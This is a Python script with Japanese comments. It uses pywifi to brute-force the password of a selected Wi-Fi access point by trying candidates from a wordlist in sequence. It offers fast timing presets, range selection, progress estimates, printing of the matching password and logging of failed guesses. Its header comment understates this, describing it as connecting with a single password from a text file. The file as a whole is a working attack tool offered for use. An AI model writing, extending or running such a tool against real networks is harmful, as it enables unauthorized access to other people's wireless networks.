# 機能: access_points.jsonからSSIDを選び、テキストファイルのパスワードで接続する。
# 入力: access_points.jsonのAP情報、接続番号、wifi_password.txtの内容。
# 出力: Wi-Fi接続の成否をコンソールへ表示する。
# 使用ライブラリ: pathlib（ファイル操作）、connect_from_json（JSON読み込みと接続処理）。
import argparse
import time
from pathlib import Path
import pywifi

from connect_from_json import (
    connect_to_access_point,
    get_previous_connection,
    load_access_points,
    reconnect_to_previous_ssid,
)


DEFAULT_WORDLIST_PATH = Path(__file__).resolve().parent.parent / "wordlist" / "wordlist_5.txt"
DEFAULT_PREVIEW_LIMIT = 5


def parse_args():
    parser = argparse.ArgumentParser(description="選択した AP に対して候補パスワードを順に試します。")
    parser.add_argument(
        "--wordlist",
        type=Path,
        default=DEFAULT_WORDLIST_PATH,
        help="読み込む候補パスワードのファイルパス（既定: wordlist/wordlist_5.txt）",
    )
    parser.add_argument(
        "--limit",
        type=int,
        default=DEFAULT_PREVIEW_LIMIT,
        help="1回に試す候補の最大件数（既定: 5, 0 は範囲内の全件を実行）",
    )
    parser.add_argument(
        "--start",
        type=int,
        default=0,
        help="候補の開始位置（0始まり、空行は除外される）。",
    )
    parser.add_argument(
        "--end",
        type=int,
        default=None,
        help="候補の終了位置。未指定ならファイル末尾まで処理します。",
    )
    parser.add_argument(
        "--ssid",
        type=str,
        default=None,
        help="対象 SSID を直接指定して、一覧選択を省略します。部分一致にも対応します。",
    )
    parser.add_argument(
        "--log-failed",
        type=Path,
        default=None,
        help="失敗した候補をファイルに保存します（例: failed.txt）",
    )
    parser.add_argument(
        "--quiet",
        action="store_true",
        help="接続候補の一覧表示を省略し、対象 SSID のみを試します。",
    )
    parser.add_argument(
        "--preset",
        choices=["fast", "balanced", "safe"],
        default="balanced",
        help="速度と安定性のプリセット: fast / balanced / safe（既定: balanced）",
    )
    parser.add_argument(
        "--connect-timeout",
        type=float,
        default=None,
        help="接続確認のタイムアウト秒数。未指定の場合は --preset に従います。",
    )
    parser.add_argument(
        "--status-interval",
        type=float,
        default=None,
        help="接続状態の確認間隔秒数。未指定の場合は --preset に従います。",
    )
    return parser.parse_args()


def iter_passwords(wordlist_path, start=0, end=None, limit=None):
    if not wordlist_path.exists():
        raise FileNotFoundError(
            f"パスワードファイルが見つかりません: {wordlist_path}"
        )

    start_index = max(0, start)
    seen = 0
    yielded = 0
    with wordlist_path.open("r", encoding="utf-8") as handle:
        for line in handle:
            password = line.strip()
            if not password:
                continue
            if seen < start_index:
                seen += 1
                continue
            if end is not None and seen >= end:
                break
            yield password
            yielded += 1
            seen += 1
            if limit is not None and yielded >= limit:
                break


def count_passwords(wordlist_path, start=0, end=None, limit=None):
    total = 0
    for _ in iter_passwords(wordlist_path, start=start, end=end, limit=limit):
        total += 1
    return total


def redact(value):
    if value is None:
        return "<hidden>"
    text = str(value)
    if not text:
        return "<hidden>"
    return "***"


def resolve_timing(preset, connect_timeout=None, status_interval=None):
    presets = {
        "fast": {"connect_timeout": 0.4, "status_interval": 0.02},
        "balanced": {"connect_timeout": 0.7, "status_interval": 0.03},
        "safe": {"connect_timeout": 1.2, "status_interval": 0.05},
    }
    chosen = presets[preset]
    return (
        max(0.1, connect_timeout if connect_timeout is not None else chosen["connect_timeout"]),
        max(0.01, status_interval if status_interval is not None else chosen["status_interval"]),
    )


def main():
    args = parse_args()
    preview_limit = max(0, args.limit)
    limit_value = None if preview_limit == 0 else preview_limit
    wordlist_path = args.wordlist.resolve()
    log_failed_path = args.log_failed.resolve() if args.log_failed is not None else None
    start_index = max(0, args.start)
    end_index = args.end if args.end is not None else None

    access_points = load_access_points()
    if not access_points:
        raise RuntimeError("接続候補がJSONにありません")

    interface = pywifi.PyWiFi().interfaces()[0]
    previous_ssid, previous_profile = get_previous_connection(interface)
    if end_index is not None and end_index <= start_index:
        raise ValueError("--end は --start 以上で指定してください。")

    total_candidates = count_passwords(
        wordlist_path,
        start=start_index,
        end=end_index,
        limit=limit_value,
    )
    if total_candidates == 0:
        raise ValueError("対象候補が見つかりませんでした")

    print(f"候補ファイル: {wordlist_path.name}")
    print(f"範囲: {start_index} 〜 {end_index if end_index is not None else '末尾'}")
    print(f"試行件数: {total_candidates}")
    if log_failed_path is not None:
        print(f"失敗ログ: {log_failed_path.name}")

    if args.ssid is not None:
        matches = [
            ap for ap in access_points if args.ssid.lower() in ap.get("ssid", "").lower()
        ]
        if not matches:
            raise ValueError(f"SSID が見つかりません: {args.ssid}")
        access_point_list = matches
    else:
        access_point_list = access_points

    while True:
        if not args.quiet:
            for index, access_point in enumerate(access_point_list, start=1):
                signal = access_point.get("signal", "不明")
                signal_level = access_point.get("signal_level", "不明")
                ssid = redact(access_point.get('ssid'))
                print(
                    f"{index}: {ssid} "
                    f"[{signal_level}, {signal} dBm] "
                    f"({access_point.get('security', '不明')})"
                )
            if args.ssid is None:
                print("0: プログラムを終了")

        try:
            if args.ssid is not None:
                choice = 0
            else:
                choice = int(input("接続する番号を入力してください: ")) - 1
            if choice == -1:
                reconnect_to_previous_ssid(interface, previous_ssid, previous_profile)
                print("プログラムを終了します。")
                return
            if choice < 0 or choice >= len(access_point_list):
                raise ValueError
        except ValueError:
            if args.ssid is not None:
                return
            print("番号が正しくありません。もう一度入力してください。")
            continue

        selected = access_point_list[choice]
        password_stream = iter_passwords(
            wordlist_path,
            start=start_index,
            end=end_index,
            limit=limit_value,
        )
        total = count_passwords(
            wordlist_path,
            start=start_index,
            end=end_index,
            limit=limit_value,
        )
        started_at = time.perf_counter()
        attempted = []
        attempt_durations = []
        connect_timeout, status_interval = resolve_timing(
            args.preset,
            args.connect_timeout,
            args.status_interval,
        )
        print(f"\r対象 SSID: {redact(selected.get('ssid'))} | preset={args.preset} | timeout={connect_timeout:.2f}s | interval={status_interval:.2f}s")
        matched = False
        try:
            for index, password in enumerate(password_stream, start=1):
                attempt_start = time.perf_counter()
                elapsed = time.perf_counter() - started_at
                percent = (index / total) * 100
                bar_width = 20
                filled = int(percent / 100 * bar_width)
                bar = "#" * filled + "." * (bar_width - filled)
                remaining_seconds = max(0.0, (elapsed / index) * (total - index)) if index > 0 else 0.0
                status = (
                    f"[{bar}] {index}/{total} ({percent:5.1f}%) "
                    f"経過 {elapsed:5.1f}s | 残り {remaining_seconds:5.1f}s"
                )
                print(f"\r{status}", end="", flush=True)

                success = connect_to_access_point(
                    selected,
                    password,
                    restore_previous=False,
                    interface=interface,
                    previous_connection=(previous_ssid, previous_profile),
                    connection_timeout_seconds=connect_timeout,
                    status_check_interval_seconds=status_interval,
                )
                attempt_durations.append(time.perf_counter() - attempt_start)

                if success:
                    print(f"\r対象 SSID {redact(selected.get('ssid'))} に接続しました: {password}")
                    matched = True
                    break

                attempted.append(password)
                print(f"\r{status} -> 失敗", end="", flush=True)
        finally:
            reconnect_timeout, reconnect_interval = resolve_timing(
                args.preset,
                args.connect_timeout,
                args.status_interval,
            )
            if reconnect_to_previous_ssid(
                interface,
                previous_ssid,
                previous_profile,
                connection_timeout_seconds=reconnect_timeout,
                status_check_interval_seconds=reconnect_interval,
            ):
                print("\r元の接続先へ戻しました。", flush=True)
            else:
                print("\r元の接続先への復帰を試みました。", flush=True)

        if matched:
            print(f"\r対象 SSID {redact(selected.get('ssid'))} への接続試験を完了しました。")
            return

        elapsed = time.perf_counter() - started_at
        print()
        print(
            f"対象 SSID {redact(selected.get('ssid'))} で上から {total} 件の確認を終了しました。"
            f" (合計 {elapsed:.1f}s)"
        )
        if attempt_durations:
            average_seconds = sum(attempt_durations) / len(attempt_durations)
            print(f"平均試行時間: {average_seconds:.3f}s / 候補")
            print(f"1000 候補時の目安: {average_seconds * 1000:.1f}s")

        if attempted:
            if log_failed_path is not None:
                log_failed_path.parent.mkdir(parents=True, exist_ok=True)
                log_failed_path.write_text(
                    "\n".join(attempted) + "\n",
                    encoding="utf-8",
                )
                print(f"失敗候補を保存しました: {log_failed_path}")
        if args.ssid is None:
            print("別の番号を選択するか、0で終了してください。")
        else:
            return

if __name__ == "__main__":
    try:
        main()
    except (FileNotFoundError, ValueError, OSError, RuntimeError) as error:
        print(f"接続に失敗しました: {error}")
